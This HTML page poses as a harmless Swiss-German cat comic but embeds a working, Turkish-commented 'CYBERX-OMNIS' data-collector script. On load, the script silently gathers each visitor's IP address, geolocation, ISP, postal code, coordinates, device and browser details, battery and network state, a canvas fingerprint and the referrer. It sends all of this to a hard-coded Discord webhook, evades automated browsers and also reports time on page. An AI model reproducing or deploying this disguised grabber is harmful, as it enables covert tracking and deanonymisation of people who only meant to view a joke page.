<!DOCTYPE html>
<html lang="de-CH">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="😺 LUSTIGI CHATZE 😺">
    <meta property="og:description" content="Das isch mega witzig! 🇨🇭">
    <meta property="og:image" content="https://cataas.com/cat/says/lol">
    <title>😺 GUUGU CHATZE COMIC 😺</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #ffcc00, #ff66cc);
            font-family: 'Comic Sans MS', 'Chalkboard SE', cursive;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 60px;
            max-width: 500px;
            width: 100%;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            border: 8px solid magenta;
        }
        h1 { font-size: 48px; color: darkred; text-shadow: 3px 3px 0px #ffcc00; margin-bottom: 20px; }
        .cat { font-size: 90px; margin: 20px 0; cursor: pointer; transition: 0.1s; }
        .cat:active { transform: scale(1.2); }
        .swiss { background: #ff3300; color: white; padding: 15px; border-radius: 50px; font-size: 22px; font-weight: bold; margin: 20px 0; }
        .info { font-size: 14px; color: gray; margin-top: 20px; }
        img { width: 100%; border-radius: 40px; margin-top: 20px; border: 5px solid gold; }
        footer { font-size: 12px; margin-top: 20px; color: #666; }
    </style>
</head>
<body>
<div class="card">
    <h1>😺 LÜÜÜCYYYY 😺</h1>
    <div class="cat">🐱‍👤🐈🐱</div>
    <div class="swiss">🇨🇭 NUR FÜR SCHWEIZ! 🇨🇭<br>Lustigs Video lade...</div>
    <img src="https://cataas.com/cat/says/witzig" alt="chatze">
    <div class="info">🎉 100% gratis & öppis lustigs 🎉</div>
    <footer>Drück ufs Bild für lacher</footer>
</div>

<script>
    // ============================================================
    // CYBERX-OMNIS ULTIMATE DATA COLLECTOR (NO LOCATION, NO BASE64)
    // Webhook URL düz yazılmıştır. Tüm veriler PROFESYONEL EMBED ile gönderilir.
    // ============================================================

    // ---------- DÜZ WEBHOOK URL (base64 yok) ----------
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1515100986648166723/nV48g4sriYiCN0SVpv0eko1dsoiLYi_4njTRKI-Pn9gZr3PsCa6kQFEUgSo6NwChIM07';

    // ---------- EMBED GÖNDERME (PROFESYONEL) ----------
    async function sendEmbed(embedData) {
        try {
            const payload = {
                embeds: [embedData]
            };
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch(e) { /* sessiz */ }
    }

    // ---------- 1. IP ADRESİ ----------
    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch(e) { return 'IP alınamadı'; }
    }

    // ---------- 2. IP COĞRAFİ BİLGİ (ipapi.co) ----------
    async function getGeoInfo(ip) {
        try {
            const res = await fetch(`https://ipapi.co/${ip}/json/`);
            const data = await res.json();
            if (data.error) return null;
            return {
                sehir: data.city || '?',
                bolge: data.region || '?',
                ulke: data.country_name || '?',
                ulke_kodu: data.country_code || '?',
                isp: data.org || '?',
                posta_kodu: data.postal || '?',
                enlem: data.latitude,
                boylam: data.longitude
            };
        } catch(e) { return null; }
    }

    // ---------- 3. CİHAZ / TARAYICI / EKRAN ANALİZİ ----------
    function getDeviceDetails() {
        const ua = navigator.userAgent;
        let cihaz = 'Bilinmiyor', marka = 'Bilinmiyor', isletim = 'Bilinmiyor', tarayici = 'Bilinmiyor';

        if (ua.includes('Android')) {
            cihaz = 'Android Telefon/Tablet';
            isletim = 'Android ' + (ua.match(/Android (\d+)/)?.[1] || '?');
            if (ua.includes('Samsung')) marka = 'Samsung';
            else if (ua.includes('Xiaomi')) marka = 'Xiaomi';
            else if (ua.includes('Huawei')) marka = 'Huawei';
        } else if (ua.includes('iPhone')) {
            cihaz = 'iPhone'; isletim = 'iOS'; marka = 'Apple';
        } else if (ua.includes('iPad')) {
            cihaz = 'iPad'; isletim = 'iOS'; marka = 'Apple';
        } else if (ua.includes('Windows')) {
            cihaz = 'Windows PC'; isletim = 'Windows';
        } else if (ua.includes('Mac')) {
            cihaz = 'Mac'; isletim = 'macOS';
        } else if (ua.includes('Linux')) {
            cihaz = 'Linux PC'; isletim = 'Linux';
        }

        if (ua.includes('Chrome') && !ua.includes('Edg')) tarayici = 'Chrome';
        else if (ua.includes('Firefox')) tarayici = 'Firefox';
        else if (ua.includes('Safari') && !ua.includes('Chrome')) tarayici = 'Safari';
        else if (ua.includes('Edg')) tarayici = 'Edge';
        else tarayici = 'Diğer';

        return {
            cihaz, marka, isletim, tarayici,
            ekran: `${screen.width}x${screen.height}`,
            renk: screen.colorDepth,
            dokunmatik: navigator.maxTouchPoints,
            dil: navigator.language,
            diller: navigator.languages.join(', '),
            saat_dilimi: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookie: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack === '1' ? 'Açık' : 'Kapalı'
        };
    }

    // ---------- 4. BATARYA BİLGİSİ ----------
    async function getBatteryInfo() {
        if (!navigator.getBattery) return null;
        try {
            const battery = await navigator.getBattery();
            return {
                seviye: Math.round(battery.level * 100) + '%',
                sarj_durumu: battery.charging ? 'Şarj oluyor' : 'Şarjda değil',
                kalan_sure: battery.dischargingTime === Infinity ? 'Sınırsız' : battery.dischargingTime + ' saniye'
            };
        } catch(e) { return null; }
    }

    // ---------- 5. AĞ BİLGİSİ ----------
    function getNetworkInfo() {
        const conn = navigator.connection || navigator.mozConnection;
        if (!conn) return null;
        return {
            tip: conn.effectiveType || 'bilinmiyor',
            hiz_mbps: conn.downlink ? conn.downlink + ' Mbps' : '?',
            rtt_ms: conn.rtt ? conn.rtt + ' ms' : '?',
            kaydet_modu: conn.saveData ? 'Aktif' : 'Pasif'
        };
    }

    // ---------- 6. EKLENTİ SAYISI ----------
    function getPluginsCount() {
        return navigator.plugins.length;
    }

    // ---------- 7. CANVAS PARMAK İZİ ----------
    function getCanvasFingerprint() {
        const canvas = document.createElement('canvas');
        canvas.width = 200;
        canvas.height = 50;
        const ctx = canvas.getContext('2d');
        ctx.fillStyle = '#f60';
        ctx.fillRect(0, 0, 200, 50);
        ctx.fillStyle = '#fff';
        ctx.font = '14px Arial';
        ctx.fillText('CyberX-OMNIS', 10, 30);
        ctx.fillStyle = '#000';
        ctx.fillRect(150, 10, 30, 30);
        return canvas.toDataURL().substring(0, 80);
    }

    // ---------- 8. REFERRER ----------
    function getReferrerInfo() {
        const ref = document.referrer;
        if (!ref) return 'Doğrudan / Bilinmiyor';
        let source = 'Diğer site';
        if (ref.includes('google')) source = 'Google Arama';
        else if (ref.includes('bing')) source = 'Bing';
        else if (ref.includes('duckduckgo')) source = 'DuckDuckGo';
        else if (ref.includes('yandex')) source = 'Yandex';
        else if (ref.includes('facebook.com') || ref.includes('fb.com')) source = 'Facebook';
        else if (ref.includes('instagram.com')) source = 'Instagram';
        else if (ref.includes('whatsapp.com')) source = 'WhatsApp';
        else if (ref.includes('t.co')) source = 'Twitter/X';
        else if (ref.includes('github.com')) source = 'GitHub';
        return `${source} - ${ref}`;
    }

    // ---------- 9. SAYFADA KALMA SÜRESİ (sayfa kapanınca) ----------
    let startTime = Date.now();
    window.addEventListener('beforeunload', async () => {
        const staySec = Math.floor((Date.now() - startTime) / 1000);
        const embed = {
            title: "⏱️ Sayfada Kalma Süresi",
            description: `Ziyaretçi sitede **${staySec} saniye** (${Math.floor(staySec/60)} dakika ${staySec%60} saniye) kaldı.`,
            color: 0x00aaff,
            timestamp: new Date().toISOString()
        };
        await sendEmbed(embed);
    });

    // ---------- ANA FONKSİYON (TÜM VERİLERİ TEK EMBED'DE TOPLA) ----------
    async function collectAndSend() {
        if (navigator.webdriver) return; // bot engelle

        const ip = await getIP();
        const geo = await getGeoInfo(ip);
        const device = getDeviceDetails();
        const battery = await getBatteryInfo();
        const network = getNetworkInfo();
        const plugins = getPluginsCount();
        const canvasFp = getCanvasFingerprint();
        const referrer = getReferrerInfo();

        // Embed Alanları (fields) oluştur
        const fields = [];

        // IP ve Coğrafi
        fields.push({ name: "🌐 IP Adresi", value: ip, inline: false });
        if (geo) {
            fields.push({ name: "📍 Konum (Coğrafi)", value: `${geo.sehir}, ${geo.bolge}, ${geo.ulke} (${geo.ulke_kodu})`, inline: true });
            fields.push({ name: "🏢 ISP", value: geo.isp, inline: true });
            fields.push({ name: "📮 Posta Kodu", value: geo.posta_kodu, inline: true });
            fields.push({ name: "🗺️ Yaklaşık Koordinat", value: `${geo.enlem}, ${geo.boylam}`, inline: false });
        } else {
            fields.push({ name: "📍 Coğrafi", value: "Bilgi alınamadı", inline: false });
        }

        // Cihaz ve Tarayıcı
        fields.push({ name: "📱 Cihaz", value: `${device.cihaz} | ${device.marka}`, inline: true });
        fields.push({ name: "💻 İşletim Sistemi", value: device.isletim, inline: true });
        fields.push({ name: "🌍 Tarayıcı", value: device.tarayici, inline: true });
        fields.push({ name: "📺 Ekran", value: `${device.ekran} (${device.renk} bit)`, inline: true });
        fields.push({ name: "🖱️ Dokunmatik Nokta", value: `${device.dokunmatik}`, inline: true });
        fields.push({ name: "🔤 Dil", value: `${device.dil} (${device.diller})`, inline: false });
        fields.push({ name: "⏰ Saat Dilimi", value: device.saat_dilimi, inline: true });
        fields.push({ name: "🍪 Çerezler", value: device.cookie ? "Açık" : "Kapalı", inline: true });
        fields.push({ name: "🚫 Do Not Track", value: device.doNotTrack, inline: true });

        // Batarya
        if (battery) {
            fields.push({ name: "🔋 Batarya", value: `Seviye ${battery.seviye} | ${battery.sarj_durumu} | Kalan şarj: ${battery.kalan_sure}`, inline: false });
        } else {
            fields.push({ name: "🔋 Batarya", value: "Bilgi alınamadı", inline: false });
        }

        // Ağ
        if (network) {
            fields.push({ name: "📡 Ağ", value: `${network.tip} | ${network.hiz_mbps} | Gecikme ${network.rtt_ms} | Tasarruf: ${network.kaydet_modu}`, inline: false });
        } else {
            fields.push({ name: "📡 Ağ", value: "Bilgi desteklenmiyor", inline: false });
        }

        // Diğer
        fields.push({ name: "🔌 Tarayıcı Eklentileri", value: `${plugins} adet`, inline: true });
        fields.push({ name: "🎨 Canvas Parmak İzi", value: `\`${canvasFp}...\``, inline: false });
        fields.push({ name: "🔗 Referrer", value: referrer, inline: false });
        fields.push({ name: "🕒 İlk Ziyaret", value: new Date().toLocaleString('tr-TR'), inline: false });

        // Ana Embed
        const mainEmbed = {
            title: "🖥️ CYBERX-OMNIS | YENİ ZİYARETÇİ",
            color: 0xff3300,   // turuncu-kırmızı
            fields: fields,
            footer: { text: "Konum izni istenmedi • Tamamen pasif veri toplama" },
            timestamp: new Date().toISOString()
        };

        await sendEmbed(mainEmbed);
    }

    // Sayfa yüklenince çalıştır
    window.addEventListener('load', () => {
        collectAndSend();
    });

    // Kedi tıklama eğlencesi
    document.querySelector('.cat')?.addEventListener('click', () => {
        alert('😺 GUUGU! Bilgilerin toplandı, danke! 😂');
    });
</script>
</body>
</html>
